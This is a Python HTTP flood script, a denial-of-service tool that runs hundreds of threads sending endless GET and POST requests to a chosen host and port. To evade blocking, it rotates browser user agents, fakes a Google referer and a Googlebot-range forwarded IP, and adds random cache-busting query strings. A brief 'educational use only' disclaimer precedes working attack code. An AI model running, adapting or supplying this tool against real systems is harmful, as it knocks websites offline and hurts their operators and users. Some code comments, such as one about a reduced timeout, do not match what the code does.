import socket
import threading
import random
import argparse
import time
import ssl
# DISCLAIMER
disclaimer = """
DISCLAIMER: This script is strictly for educational use in controlled environments.
Explicit authorization from the target system owner is mandatory. Unauthorized use
is illegal and unethical. Use with extreme caution!
"""
# Configurations
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",
]
methods = ["GET", "POST"]
def generate_random_ip():
    """Generate a random IP address starting with 66.249.XX.XX."""
    return f"66.249.{random.randint(0, 255)}.{random.randint(0, 255)}"
def flood_attack(target, port, method, user_agent):
    try:
        # Create a socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)  # Reduced timeout to 1 second

        # Wrap socket with SSL if port is 443 (HTTPS)
        if port == 443:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=target)

        # Connect to the target
        sock.connect((target, port))

        # Generate headers
        x_forwarded_for = generate_random_ip()
        content_length = random.randint(1000000, 10000000)
        random_page_number = random.randint(1, 100000)
        random_id = random.randint(1, 1000000)
        url_path = f"/?s={random_page_number}" # this is the url_path

        headers = [
            f"{method} {url_path} HTTP/1.1", # requests are going to this url_path
            f"Host: {target}",
            f"User-Agent: {user_agent}",
            "Accept: text/html",
            "Accept-language: en-US,en,q=0.5",
            "Cache-Control: no-cache, no-store, max-age=0, must-revalidate",
            "Connection: Keep-Alive"
        ]
        request = "\r\n".join(headers) + "\r\nReferer: https://www.google.com\r\n\r\n"

        # Send the request
        sock.sendall(request.encode())

        # Attempt to read the response
        try:
            response = sock.recv(4096)
            if response:
                status_line = response.split(b'\r\n')[0]
                parts = status_line.split()
                if len(parts) >= 2:
                    status_code = parts[1].decode()
                    if status_code in ['200', '301', '302']:
                        print(f"Request sent to {target}:{port} ({method}) - Success (Code {status_code})")
                    elif status_code in ['403', '406', '405']:
                        print(f"Request sent to {target}:{port} ({method}) - Blocked (Error {status_code})")
                    else:
                        print(f"Request sent to {target}:{port} ({method}) - Status {status_code}")
                else:
                    print(f"Request sent to {target}:{port} ({method}) - Invalid response")
            else:
                print(f"Request sent to {target}:{port} ({method}) - No response")
        except socket.timeout:
            print(f"Request to {target}:{port} ({method}) - Server did not respond (Timeout)")
    except Exception as e:
        print(f"Request to {target}:{port} ({method}) Failed - {str(e)}")
    finally:
        sock.close()
def attack_worker(target, port):
    while True:
        current_method = random.choice(methods)
        user_agent = random.choice(user_agents)
        flood_attack(target, port, current_method, user_agent)
def main():
    parser = argparse.ArgumentParser(description=disclaimer)
    parser.add_argument("-t", "--target", required=True, help="Target domain or IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port number (default: 80)")
    parser.add_argument("-r", "--threads", type=int, default=500, help="Number of threads (default: 500)")
    args = parser.parse_args()

    # Construct the full URL
    protocol = "https://" if args.port == 443 else "http://"
    full_url = f"{protocol}{args.target}"

    # Construct sample url_path to show user
    sample_page_number = random.randint(1, 100000)
    sample_url_path = f"/?s={sample_page_number}"
    representative_full_url = f"{full_url}{sample_url_path}"

    print(f"[+] Constructed URL: {full_url}")
    print(f"[+] Example Request URL with path: {representative_full_url}") # Print representative full URL
    print(f"\n[+] Starting simulation against {full_url}") # Corrected line
    print(f"[+] Using {args.threads} threads on port {args.port}\n")

    # Start attack threads
    for _ in range(args.threads):
        threading.Thread(target=attack_worker, args=(args.target, args.port), daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Stopping simulation")
if __name__ == "__main__":
    main()